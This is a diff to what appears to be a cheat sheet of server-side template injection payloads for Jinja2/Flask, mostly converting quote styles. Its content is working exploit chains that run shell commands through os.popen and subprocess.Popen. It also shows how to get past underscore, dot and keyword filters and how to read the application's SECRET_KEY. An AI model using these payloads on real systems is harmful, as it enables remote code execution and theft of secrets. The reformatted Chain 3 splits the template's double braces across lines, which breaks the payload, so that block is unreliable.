@@ -92,35 +92,45 @@ Identifying language from errors → then narrow to template engine.
 
 ### Chain 1: `os` module via `__globals__`
 ```python
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{config.__class__.__init__.__globals__["os"].popen("id").read()}}
 ```
 
 ### Chain 2: MRO subclass traversal (sandbox escape)
 ```python
 # List all subclasses:
-{{''.__class__.__mro__[1].__subclasses__()}}
+{{"".__class__.__mro__[1].__subclasses__()}}
 
 # Find subprocess.Popen index (usually around 258-270, varies by Python version):
 # Look for "subprocess.Popen" in the list
 
 # Execute command (replace [258] with correct index):
-{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0]}}
+{{"".__class__.__mro__[1].__subclasses__()[258]("id", shell=True, stdout=-1).communicate()[0]}}
 ```
 
 ### Chain 3: `request` object globals (works when `config` blocked)
 ```python
-{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+{
+    {
+        request
+        | attr("application")
+        | attr("\x5f\x5fglobals\x5f\x5f")
+        | attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")
+        | attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")
+        | attr("popen")("id")
+        | attr("read")()
+    }
+}
 ```
 (Uses hex encoding to avoid `_` filtering)
 
 ### Chain 4: `lipsum` function globals (Flask built-in)
 ```python
-{{lipsum.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__.os.popen("id").read()}}
 ```
 
 ### Chain 5: `cycler` object
 ```python
-{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen("id").read()}}
 ```
 
 ### Finding correct subprocess index dynamically:
@@ -140,17 +150,17 @@ Identifying language from errors → then narrow to template engine.
 ### When `_` (underscore) is blocked:
 ```python
 # Use attr filter with hex encoding:
-''|attr('\x5f\x5fclass\x5f\x5f')
+"" | attr("\x5f\x5fclass\x5f\x5f")
 
 # Use getattr via request object:
-request|attr('args')|attr('__class__')
+request | attr("args") | attr("__class__")
 ```
 
 ### When `.` (dot) is blocked:
 ```python
 # Use [] subscript notation:
-''['__class__']
-config['SECRET_KEY']
+""["__class__"]
+config["SECRET_KEY"]
 ```
 
 ### When keywords (class, mro) are blocked:
